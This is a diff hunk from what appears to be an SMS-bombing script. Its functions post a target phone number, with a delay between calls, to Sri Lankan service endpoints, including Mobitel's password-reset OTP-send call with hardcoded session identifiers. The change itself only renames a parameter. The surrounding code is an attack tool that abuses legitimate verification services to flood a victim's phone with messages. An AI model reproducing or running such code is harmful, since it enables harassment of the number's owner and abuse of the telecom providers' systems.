@@ -38,7 +38,7 @@ def kangaroo(num,delay):
 	body={'contactNumber':num,'countryCode':'+94'}
 	po=post(url,data=body)
 	sleep(delay)
-def moba(num,acc):
+def moba(num,delay):
 	url='https://sc.mobitel.lk/MyAccount/dwr/call/plaincall/customer_information_change.password_reset_otp_code_send.dwr' 
 	head={'Host':'sc.mobitel.lk'}
 	data={'callCount':'1','page':'/MyAccount/myaccount_reset_password.jsp','httpSessionId':'tNuBGCK2qPfMtpzztFRY8GYx','scriptSessionId':'47014AD7441CF94B1689F490488461F2647','c0-scriptName':'customer_information_change','c0-methodName':'password_reset_otp_code_send','c0-id':'0','c0-param0':f'string:{num}','batchId':'2'}
